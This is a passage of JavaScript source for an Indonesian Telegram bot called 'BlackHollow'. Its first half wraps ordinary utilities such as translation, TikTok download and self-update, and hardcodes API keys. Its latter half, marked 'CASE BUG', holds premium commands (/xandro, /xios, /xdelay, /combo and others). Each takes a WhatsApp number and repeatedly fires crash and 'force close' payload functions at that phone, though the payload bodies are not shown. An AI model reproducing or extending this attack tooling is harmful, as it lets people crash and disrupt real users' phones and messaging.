    const { data, status } = await axios.get("https://api.ikyyxd.my.id/ai/fixerror", {
      params: {
        apikey: "kyzz",
        text
      },
      timeout: 120000,
      validateStatus: () => true,
      headers: {
        Accept: "application/json",
        "User-Agent": "Mozilla/5.0"
      }
    });

    console.log("FIXERROR STATUS:", status);
    console.log("FIXERROR RESPONSE:", data);

    if (status !== 200 || !data?.status) {
      return ctx.reply(
        `❌ API error.\n` +
        `Status: ${status}\n` +
        `Info: ${data?.message || "Tidak diketahui"}`
      );
    }

    const result = data.result;

    if (!result) {
      return ctx.reply("❌ Hasil fix error tidak ditemukan dari API.");
    }

    return sendFixErrorResult(ctx, String(result));

  } catch (err) {
    console.error("FIXERROR ERROR:", err.response?.data || err.message || err);
    return ctx.reply("❌ Terjadi kesalahan saat memproses fix error.");
  }
});

async function sendFixErrorResult(ctx, code) {
  const maxPreviewLength = 3000;

  // Kalau kode pendek, kirim langsung sebagai code block
  if (code.length <= maxPreviewLength) {
    return ctx.reply(
      `✅ Hasil Fix Error\n\n` +
      `<pre><code class="language-js">${escapeHtml(code)}</code></pre>`,
      {
        parse_mode: "HTML",
        disable_web_page_preview: true
      }
    );
  }

  // Kalau kode panjang, kirim sebagai file .js
  const fileBuffer = Buffer.from(code, "utf8");

  await ctx.reply(
    `✅ Hasil Fix Error terlalu panjang.\n\n` +
    `📄 Saya kirim sebagai file JavaScript agar tidak kepotong.`
  );

  return ctx.replyWithDocument(
    {
      source: fileBuffer,
      filename: "fixerror-result.js"
    },
    {
      caption:
        `✅ Hasil Fix Error\n\n` +
        `📦 Format: JavaScript file\n` +
        `📏 Panjang kode: ${code.length.toLocaleString("id-ID")} karakter`
    }
  );
}

function escapeHtml(text = "") {
  return String(text)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;");
}

const AdmZip = require("adm-zip");

const CURRENT_VERSION = "1.0.0";
const UPDATE_JSON_URL = "https://raw.githubusercontent.com/rafaeladity/Databs/refs/heads/main/update.json";

async function getUpdateInfo() {
  const { data, status } = await axios.get(UPDATE_JSON_URL, {
    timeout: 30000,
    validateStatus: () => true,
    headers: {
      "User-Agent": "Mozilla/5.0",
      Accept: "application/json"
    }
  });

  if (status !== 200 || !data) {
    throw new Error(`Gagal mengambil update.json. Status: ${status}`);
  }

  return data;
}

function versionIsNewer(remote, local) {
  const r = String(remote).split(".").map(Number);
  const l = String(local).split(".").map(Number);

  for (let i = 0; i < Math.max(r.length, l.length); i++) {
    const rv = r[i] || 0;
    const lv = l[i] || 0;

    if (rv > lv) return true;
    if (rv < lv) return false;
  }

  return false;
}

function isOwnerUpdate(userId) {
  return String(userId) === String(ownerID);
}

bot.command("cekupdate", async (ctx) => {
  try {
    if (!isOwnerUpdate(ctx.from.id)) {
      return ctx.reply("❌ Command ini khusus owner.");
    }

    await ctx.reply("🔎 Mengecek update BlackHollow...");

    const info = await getUpdateInfo();

    const latestVersion = info.version || "unknown";
    const message = info.message || "-";

    if (versionIsNewer(latestVersion, CURRENT_VERSION)) {
      return ctx.reply(
        `🆕 Update tersedia!\n\n` +
        `📦 Versi sekarang: ${CURRENT_VERSION}\n` +
        `🚀 Versi terbaru: ${latestVersion}\n\n` +
        `📝 Info update:\n${message}\n\n` +
        `Ketik /update untuk memasang update.`
      );
    }

    return ctx.reply(
      `✅ SC sudah versi terbaru.\n\n` +
      `📦 Versi sekarang: ${CURRENT_VERSION}`
    );

  } catch (err) {
    console.error("CEKUPDATE ERROR:", err.message);
    return ctx.reply(`❌ Gagal cek update.\n\n${err.message}`);
  }
});

bot.command("update", async (ctx) => {
  try {
    if (!isOwnerUpdate(ctx.from.id)) {
      return ctx.reply("❌ Command ini khusus owner.");
    }

    await ctx.reply("🔎 Mengecek update...");

    const info = await getUpdateInfo();

    const latestVersion = info.version;
    const zipUrl = info.zipUrl;

    if (!latestVersion || !zipUrl) {
      return ctx.reply("❌ update.json tidak lengkap. Harus ada version dan zipUrl.");
    }

    if (!versionIsNewer(latestVersion, CURRENT_VERSION)) {
      return ctx.reply(
        `✅ Tidak ada update baru.\n\n` +
        `📦 Versi sekarang: ${CURRENT_VERSION}\n` +
        `🚀 Versi GitHub: ${latestVersion}`
      );
    }

    await ctx.reply(
      `⬇️ Update ditemukan!\n\n` +
      `📦 Versi lama: ${CURRENT_VERSION}\n` +
      `🚀 Versi baru: ${latestVersion}\n\n` +
      `Sedang download file update...`
    );

    const updateDir = path.join(process.cwd(), "tmp_update");
    const zipPath = path.join(process.cwd(), "update.zip");
    const backupDir = path.join(process.cwd(), `backup_${Date.now()}`);

    if (fs.existsSync(updateDir)) {
      fs.rmSync(updateDir, { recursive: true, force: true });
    }

    const res = await axios.get(zipUrl, {
      responseType: "arraybuffer",
      timeout: 180000,
      maxContentLength: Infinity,
      maxBodyLength: Infinity,
      headers: {
        "User-Agent": "Mozilla/5.0"
      }
    });

    fs.writeFileSync(zipPath, Buffer.from(res.data));

    await ctx.reply("📦 Update berhasil didownload. Membuat backup...");

    fs.mkdirSync(backupDir, { recursive: true });

    const backupItems = [
      "Nuxz.js",
      "package.json",
      "config.js",
      "database"
    ];

    for (const item of backupItems) {
      const src = path.join(process.cwd(), item);
      const dest = path.join(backupDir, item);

      if (fs.existsSync(src)) {
        fs.cpSync(src, dest, { recursive: true });
      }
    }

    await ctx.reply("✅ Backup dibuat. Mengekstrak update...");

    const zip = new AdmZip(zipPath);
    zip.extractAllTo(updateDir, true);

    const extractedRoot = fs.readdirSync(updateDir)
      .map(name => path.join(updateDir, name))
      .find(p => fs.existsSync(p) && fs.statSync(p).isDirectory());

    if (!extractedRoot) {
      throw new Error("Folder hasil extract tidak ditemukan.");
    }

    const skipItems = [
      "node_modules",
      "data",
      "database",
      "session",
      "sessions",
      "auth_info",
      "tmp_update",
      "update.zip",
      ".env",
      "config.js"
    ];

    const files = fs.readdirSync(extractedRoot);

    for (const file of files) {
      if (skipItems.includes(file)) continue;

      const src = path.join(extractedRoot, file);
      const dest = path.join(process.cwd(), file);

      fs.cpSync(src, dest, {
        recursive: true,
        force: true
      });
    }

    fs.rmSync(updateDir, { recursive: true, force: true });
    fs.rmSync(zipPath, { force: true });

    await ctx.reply(
      `✅ Update berhasil dipasang!\n\n` +
      `🚀 Versi baru: ${latestVersion}\n` +
      `🗂️ Backup: ${path.basename(backupDir)}\n\n` +
      `Bot akan restart...`
    );

    setTimeout(() => {
      process.exit(0);
    }, 3000);

  } catch (err) {
    console.error("UPDATE ERROR:", err.response?.data || err.message || err);
    return ctx.reply(`❌ Gagal update SC.\n\n${err.message || err}`);
  }
});

bot.command("play", async (ctx) => {
  try {
    const query = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

    if (!query) {
      return ctx.reply(
        "❌ Masukkan judul lagu.\n\n" +
        "Contoh:\n" +
        "/spotifyplay Cikadap"
      );
    }

    await ctx.reply("⏳ Sedang mencari lagu di Spotify...");

    const { data, status } = await axios.get("https://api.ikyyxd.my.id/search/spotifyplay", {
      params: {
        query
      },
      timeout: 120000,
      validateStatus: () => true,
      headers: {
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0"
      }
    });

    console.log("SPOTIFYPLAY STATUS:", status);
    console.log("SPOTIFYPLAY RESPONSE:", data);

    if (status !== 200 || !data) {
      return ctx.reply(`❌ API error.\nStatus: ${status}`);
    }

    if (!data.status || !data.result) {
      return ctx.reply("❌ Lagu tidak ditemukan.");
    }

    const result = data.result;

    const title = result.title || "Unknown Title";
    const artist = result.artist || "Unknown Artist";
    const album = result.album || "-";
    const duration = result.duration || "-";
    const spotifyUrl = result.url || "";
    const thumbnail = result.thumbnail || "";
    const downloadUrl = result.download || "";

    if (!downloadUrl) {
      return ctx.reply(
        `❌ Link download tidak ditemukan.\n\n` +
        `🎵 Judul: ${title}\n` +
        `👤 Artist: ${artist}\n` +
        `💿 Album: ${album}\n` +
        `⏱️ Durasi: ${duration}\n` +
        `${spotifyUrl ? `🔗 Spotify: ${spotifyUrl}` : ""}`,
        { disable_web_page_preview: true }
      );
    }

    const infoText =
      `🎵 *Spotify Play*\n\n` +
      `📌 Judul: ${title}\n` +
      `👤 Artist: ${artist}\n` +
      `💿 Album: ${album}\n` +
      `⏱️ Durasi: ${duration}\n\n` +
      `📥 Sedang mengirim audio...`;

    if (thumbnail) {
      await ctx.replyWithPhoto(
        { url: thumbnail },
        {
          caption: infoText,
          parse_mode: "Markdown"
        }
      );
    } else {
      await ctx.reply(infoText, { parse_mode: "Markdown" });
    }

    const audioRes = await axios.get(downloadUrl, {
      responseType: "arraybuffer",
      timeout: 300000,
      maxContentLength: Infinity,
      maxBodyLength: Infinity,
      validateStatus: () => true,
      headers: {
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*"
      }
    });

    console.log("SPOTIFY AUDIO STATUS:", audioRes.status);

    if (audioRes.status !== 200) {
      throw new Error(`Gagal download audio. Status: ${audioRes.status}`);
    }

    const audioBuffer = Buffer.from(audioRes.data);

    if (!audioBuffer || audioBuffer.length < 1000) {
      throw new Error("File audio tidak valid atau terlalu kecil.");
    }

    const safeTitle = title
      .replace(/[^\w\s-]/g, "")
      .trim()
      .replace(/\s+/g, "_") || "spotify_audio";

    return ctx.replyWithAudio(
      {
        source: audioBuffer,
        filename: `${safeTitle}.mp3`
      },
      {
        caption:
          `✅ Audio berhasil dikirim\n\n` +
          `🎵 ${title}\n` +
          `👤 ${artist}`,
        performer: artist,
        title: title
      }
    );

  } catch (err) {
    console.error("SPOTIFYPLAY ERROR:", err.response?.data || err.message || err);
    return ctx.reply("❌ Terjadi kesalahan saat memproses Spotify Play.");
  }
});

bot.command("kodepos", async (ctx) => {
  try {
    const query = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

    if (!query) {
      return ctx.reply(
        "❌ Masukkan nama daerah.\n\n" +
        "Contoh:\n/kodepos Tebing tinggi"
      );
    }

    await ctx.reply("🔎 Sedang mencari kode pos...");

    const { data, status } = await axios.get("https://api.siputzx.my.id/api/tools/kodepos", {
      params: {
        form: query
      },
      timeout: 60000,
      validateStatus: () => true,
      headers: {
        Accept: "application/json",
        "User-Agent": "Mozilla/5.0"
      }
    });

    console.log("KODEPOS STATUS:", status);
    console.log("KODEPOS RESPONSE:", data);

    if (status !== 200 || !data) {
      return ctx.reply(`❌ API error.\nStatus: ${status}`);
    }

    const result = data.result || data.data || data;

    if (Array.isArray(result)) {
      if (!result.length) return ctx.reply("❌ Data kode pos tidak ditemukan.");

      const teks = result.slice(0, 20).map((item, i) => {
        return (
          `${i + 1}. ${item.kelurahan || item.desa || item.village || item.nama || "-"}\n` +
          `Kecamatan: ${item.kecamatan || item.district || "-"}\n` +
          `Kota/Kab: ${item.kabupaten || item.kota || item.regency || "-"}\n` +
          `Provinsi: ${item.provinsi || item.province || "-"}\n` +
          `Kode Pos: ${item.kodepos || item.kode_pos || item.postalcode || item.postal_code || "-"}`
        );
      }).join("\n\n");

      return ctx.reply(`📮 Hasil Kode Pos: ${query}\n\n${teks}`);
    }

    const kodepos =
      result.kodepos ||
      result.kode_pos ||
      result.postalcode ||
      result.postal_code ||
      data.kodepos ||
      data.kode_pos ||
      "-";

    const lokasi =
      result.lokasi ||
      result.nama ||
      result.address ||
      result.alamat ||
      query;

    return ctx.reply(
      `📮 Hasil Kode Pos\n\n` +
      `📍 Lokasi: ${lokasi}\n` +
      `🏷️ Kode Pos: ${kodepos}`
    );

  } catch (err) {
    console.error("KODEPOS ERROR:", err.response?.data || err.message || err);
    return ctx.reply("❌ Terjadi kesalahan saat mencari kode pos.");
  }
});

bot.command("translate", async (ctx) => {
  try {
    const input = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

    if (!input) {
      return ctx.reply(
        "❌ Format salah.\n\n" +
        "Contoh:\n" +
        "/translate en|id|I love you\n\n" +
        "Keterangan:\n" +
        "en = bahasa asal\n" +
        "id = bahasa tujuan"
      );
    }

    let source = "en";
    let target = "id";
    let text = input;

    if (input.includes("|")) {
      const parts = input.split("|").map(v => v.trim());
      source = parts[0] || "en";
      target = parts[1] || "id";
      text = parts.slice(2).join("|").trim();
    }

    if (!text) {
      return ctx.reply("❌ Teks yang mau diterjemahkan kosong.");
    }

    await ctx.reply("🌐 Sedang menerjemahkan...");

    const { data, status } = await axios.get("https://api.siputzx.my.id/api/tools/translate", {
      params: {
        text,
        source,
        target
      },
      timeout: 60000,
      validateStatus: () => true,
      headers: {
        Accept: "application/json",
        "User-Agent": "Mozilla/5.0"
      }
    });

    console.log("TRANSLATE STATUS:", status);
    console.log("TRANSLATE RESPONSE:", data);

    if (status !== 200 || !data) {
      return ctx.reply(`❌ API error.\nStatus: ${status}`);
    }

    const result = data.result || data.data || data;

    const translated =
      result.translatedText ||
      result.translate ||
      result.translation ||
      result.text ||
      result.result ||
      data.translatedText ||
      data.translate ||
      data.translation ||
      data.result ||
      null;

    if (!translated) {
      return ctx.reply("❌ Hasil translate tidak ditemukan dari API.");
    }

    return ctx.reply(
      `🌐 Hasil Translate\n\n` +
      `📥 Dari: ${source}\n` +
      `📤 Ke: ${target}\n\n` +
      `📝 Teks:\n${text}\n\n` +
      `✅ Hasil:\n${translated}`
    );

  } catch (err) {
    console.error("TRANSLATE ERROR:", err.response?.data || err.message || err);
    return ctx.reply("❌ Terjadi kesalahan saat translate.");
  }
});

bot.command("tiktok", async (ctx) => {
  try {
    const input = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

    if (!input) {
      return ctx.reply(
        "❌ Masukkan link TikTok.\n\n" +
        "Contoh:\n" +
        "/tiktok https://vt.tiktok.com/ZS96npU3n/"
      );
    }

    const urlMatch = input.match(/https?:\/\/[^\s]+/i);
    const tiktokUrl = urlMatch ? urlMatch[0] : input;

    if (!/tiktok\.com|vt\.tiktok\.com|vm\.tiktok\.com/i.test(tiktokUrl)) {
      return ctx.reply("❌ Link TikTok tidak valid.");
    }

    await ctx.reply("⏳ Sedang download video TikTok...");

    const { data, status } = await axios.get("https://api.betabotz.eu.org/api/download/tiktok", {
      params: {
        apikey: "rafaelapikey",
        url: tiktokUrl
      },
      headers: {
        Accept: "application/json"
      },
      timeout: 120000,
      validateStatus: () => true
    });

    console.log("TIKTOK STATUS:", status);
    console.log("TIKTOK RESPONSE:", data);

    if (status !== 200 || !data) {
      return ctx.reply(`❌ API error.\nStatus: ${status}`);
    }

    const result = data.result || data.data || data;

    const title =
      result.title ||
      result.caption ||
      result.desc ||
      data.title ||
      "TikTok Downloader";

    const author =
      result.author?.nickname ||
      result.author?.unique_id ||
      result.author ||
      result.username ||
      "-";

    const videoUrl =
      result.video ||
      result.video_url ||
      result.no_watermark ||
      result.noWatermark ||
      result.nowm ||
      result.play ||
      result.download ||
      result.url ||
      result.hdplay ||
      result.wmplay ||
      null;

    const musicUrl =
      result.music ||
      result.audio ||
      result.sound ||
      result.music_info?.play ||
      null;

    const images =
      result.images ||
      result.image ||
      result.photo ||
      [];

    if (Array.isArray(images) && images.length > 0) {
      await ctx.reply(`🖼️ TikTok ini berisi foto/slideshow.\nJumlah foto: ${images.length}`);

      for (const img of images.slice(0, 10)) {
        await ctx.replyWithPhoto(
          { url: typeof img === "string" ? img : img.url },
          { caption: "✅ Foto TikTok berhasil diambil." }
        );
      }

      if (musicUrl) {
        await ctx.replyWithAudio(
          { url: musicUrl },
          { caption: "🎵 Audio TikTok" }
        );
      }

      return;
    }

    if (!videoUrl) {
      return ctx.reply("❌ Link video dari API tidak ditemukan. Cek console TIKTOK RESPONSE.");
    }

    return ctx.replyWithVideo(
      { url: videoUrl },
      {
        caption:
          `✅ TikTok berhasil didownload\n\n` +
          `🎬 Judul: ${title}\n` +
          `👤 Author: ${author}`,
        disable_web_page_preview: true
      }
    );

  } catch (err) {
    console.error("TIKTOK ERROR:", err.response?.data || err.message || err);
    return ctx.reply("❌ Terjadi kesalahan saat download TikTok.");
  }
});

bot.command("web2apk", async (ctx) => {
  try {
    const text = (ctx.message.text || "").split(" ").slice(1).join(" ").trim();

    if (!text) {
      return ctx.reply("❌ Contoh:\n/web2apk https://example.com NamaApp");
    }

    const parts = text.split(" ");
    const websiteUrl = (parts[0] || "").trim();
    const appNameRaw = parts.slice(1).join(" ").trim() || "WebApp";

    if (!/^https?:\/\//i.test(websiteUrl)) {
      return ctx.reply("❌ URL harus diawali http:// atau https://");
    }

    const safeAppName = appNameRaw
      .replace(/[^\w\s-]/g, "")
      .trim()
      .replace(/\s+/g, "_") || "WebApp";

    await ctx.reply("⏳ Sedang memproses website menjadi aplikasi...");

    const apiUrl = `https://api.ikyyxd.my.id/tools/web2apk?url=${encodeURIComponent(websiteUrl)}`;

    const { data, status } = await axios.get(apiUrl, {
      timeout: 240000,
      validateStatus: () => true,
      headers: {
        "Accept": "application/json",
        "User-Agent": "Mozilla/5.0"
      }
    });

    console.log("WEB2APK STATUS:", status);
    console.log("WEB2APK RESPONSE:", data);

    if (status !== 200 || !data) {
      return ctx.reply(
        `❌ API error.\n` +
        `Status: ${status}\n\n` +
        `Coba lagi beberapa saat nanti.`
      );
    }

    const success = data?.status ?? data?.success ?? false;
    const result = data?.result || {};

    if (!success) {
      return ctx.reply("❌ Gagal memproses website menjadi aplikasi.");
    }

    const app = result.app_name || appNameRaw;
    const website = result.website || websiteUrl;

    const androidUrl =
      result.android ||
      result.apk ||
      result.download_android ||
      result.android_url ||
      null;

    const iosUrl =
      result.ios ||
      result.ipa ||
      result.download_ios ||
      result.ios_url ||
      null;

    if (!androidUrl && !iosUrl) {
      return ctx.reply(
        `❌ File Android/iOS tidak ditemukan dari API.\n\n` +
        `📦 App: ${app}\n` +
        `🔗 Website: ${website}`,
        { disable_web_page_preview: true }
      );
    }

    await ctx.reply("📥 File aplikasi ditemukan. Sedang download Android dan iOS...");

    let androidSent = false;
    let iosSent = false;

    if (androidUrl) {
      try {
        await sendWeb2ApkFile(
          ctx,
          androidUrl,
          `${safeAppName}.apk`,
          `✅ Android APK berhasil dibuat\n\n` +
          `📦 App: ${app}\n` +
          `🔗 Website: ${website}`
        );

        androidSent = true;
      } catch (err) {
        console.error("ANDROID SEND ERROR:", err.response?.data || err.message || err);
        await ctx.reply("⚠️ Android APK gagal didownload/dikirim sebagai file.");
      }
    }

    if (iosUrl) {
      try {
        await sendWeb2ApkFile(
          ctx,
          iosUrl,
          `${safeAppName}.ipa`,
          `✅ iOS IPA berhasil dibuat\n\n` +
          `📦 App: ${app}\n` +
          `🔗 Website: ${website}`
        );

        iosSent = true;
      } catch (err) {
        console.error("IOS SEND ERROR:", err.response?.data || err.message || err);
        await ctx.reply("⚠️ iOS IPA gagal didownload/dikirim sebagai file.");
      }
    }

    return ctx.reply(
      `✅ Web2Apk selesai.\n\n` +
      `🤖 Android: ${androidSent ? "terkirim" : "gagal"}\n` +
      `🍏 iOS: ${iosSent ? "terkirim" : "gagal"}`
    );

  } catch (err) {
    console.error("WEB2APK ERROR:", err.response?.data || err.message || err);
    return ctx.reply("❌ Terjadi kesalahan saat memproses web2apk.");
  }
});

async function sendWeb2ApkFile(ctx, fileUrl, filename, caption) {
  if (!/^https?:\/\//i.test(fileUrl)) {
    throw new Error("URL file tidak valid.");
  }

  const fileRes = await axios.get(fileUrl, {
    responseType: "arraybuffer",
    timeout: 300000,
    maxContentLength: Infinity,
    maxBodyLength: Infinity,
    validateStatus: () => true,
    headers: {
      "User-Agent": "Mozilla/5.0",
      "Accept": "*/*"
    }
  });

  console.log(`${filename} DOWNLOAD STATUS:`, fileRes.status);
  console.log(`${filename} CONTENT-TYPE:`, fileRes.headers?.["content-type"]);

  if (fileRes.status !== 200) {
    throw new Error(`Download gagal. Status: ${fileRes.status}`);
  }

  const buffer = Buffer.from(fileRes.data);

  if (!buffer || buffer.length < 1000) {
    throw new Error("File terlalu kecil / tidak valid.");
  }

  await ctx.replyWithDocument(
    {
      source: buffer,
      filename
    },
    {
      caption,
      disable_web_page_preview: true
    }
  );
}

async function sendRemoteFileAsDocument(ctx, fileUrl, filename, caption) {
  if (!/^https?:\/\//i.test(fileUrl)) {
    throw new Error("URL file tidak valid.");
  }

  const fileRes = await axios.get(fileUrl, {
    responseType: "arraybuffer",
    timeout: 300000,
    maxContentLength: Infinity,
    maxBodyLength: Infinity,
    validateStatus: () => true,
    headers: {
      "User-Agent": "Mozilla/5.0",
      "Accept": "*/*"
    }
  });

  console.log("FILE DOWNLOAD STATUS:", fileRes.status);
  console.log("FILE CONTENT-TYPE:", fileRes.headers?.["content-type"]);

  if (fileRes.status !== 200) {
    throw new Error(`Download file gagal. Status: ${fileRes.status}`);
  }

  const buffer = Buffer.from(fileRes.data);

  if (!buffer || buffer.length < 1000) {
    throw new Error("File hasil download terlalu kecil / tidak valid.");
  }

  await ctx.replyWithDocument(
    {
      source: buffer,
      filename
    },
    {
      caption,
      disable_web_page_preview: true
    }
  );
}

bot.command("cekwa", checkWhatsAppConnection, async (ctx) => {
    const args = ctx.message.text.split(" ");

    if (!args[1]) {
        return ctx.reply("Format:\n/cekwa 628xxxx");
    }

    const result = await ultraRealChecker(sock, args[1]);

    const msg = `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>

⌬ Status      : ${result.status}
⌬ Banned      : ${result.banned}
⌬ Business    : ${result.business}
⌬ Meta Verify : ${result.verified}
⌬ Privacy     : ${result.privacy || "-"}
⌬ Info        : ${result.note}

<blockquote><pre>⚡ Leviathan Ghost Detection System</pre></blockquote>
`;

    ctx.reply(msg, { parse_mode: "HTML" });
});

// CASE BUG 
bot.command("xandro", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xandro 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Forclose Android Bebas Spam 
⌑ Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await bynortexz(sock, target);
    await sleep(3000);

  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Forclose Android Bebas Spam
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("combo", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /combo 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Combo All Funct 
⌑ Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await tesss(sock, target);
    await blankmsg(sock, target);
    await XGhost(sock, target);

  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Combo All Funct 
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xios", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xios 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Forclose Ios Bebas Spam
⌑ Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await fcinvis(sock, target);
    await sleep(3000);
    
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Forclose Ios Bebas Spam 
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xdel", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xdel 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Forclose Spam
⌑ Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await tesss(sock, target);
    await blankmsg(sock, target);
    await sleep(1000);

  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Forclose Spam
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});



bot.command("xdelay", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xdelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Delay Invisible Bebas Spam
⌑ Status: Process`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 5; i++) {
    await XGhost(sock, target);
    await DileyHarddd(sock, target);
    await sleep(3000);
        
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Delay Invisible Bebas Spam
⌑ Status: Success`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ ターゲット", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("xdocu", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /xdocu 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>⬡═―—⊱ ⎧ 𝐁𝐥𝐚𝐜𝐤𝐇𝐨𝐥𝐥𝐨𝐰 ⎭ ⊰―—═⬡</pre></blockquote>
⌑ Target: ${q}
⌑ Type: Blank Document
⌑ Status: Process`,
